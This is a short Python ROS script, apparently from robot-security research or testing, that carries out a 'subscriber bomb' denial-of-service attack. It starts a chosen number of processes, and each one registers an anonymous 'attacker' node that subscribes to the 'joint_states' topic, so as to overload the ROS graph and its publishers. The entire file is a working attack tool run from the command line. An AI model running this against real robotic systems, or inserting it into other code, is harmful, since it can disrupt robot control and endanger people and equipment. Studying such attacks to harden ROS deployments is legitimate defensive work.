#!/usr/bin/env python

import rospy
import multiprocessing as mp
import sys

from nav_msgs.msg import Odometry
from std_msgs.msg import String
from sensor_msgs.msg import JointState

def callback(msg):
    pass

def attacker(id):
    
    rospy.init_node('attacker' + id, anonymous=True)
    #rospy.Subscriber('QoS', String, callback)
    rospy.Subscriber('joint_states', JointState, callback)
    rospy.spin()


def SubscriberBombAttack(count):
    print("Subscriber Bomb Attack Started!")
    attackerProcesses = []
    for i in range(count):
        attackerProcesses.append(mp.Process(target=attacker, args=(str(i),)))
        attackerProcesses[i].start()

if __name__ == "__main__":
    args = sys.argv
    
    if len(args) == 2:
        SubscriberBombAttack(int(args[1]))
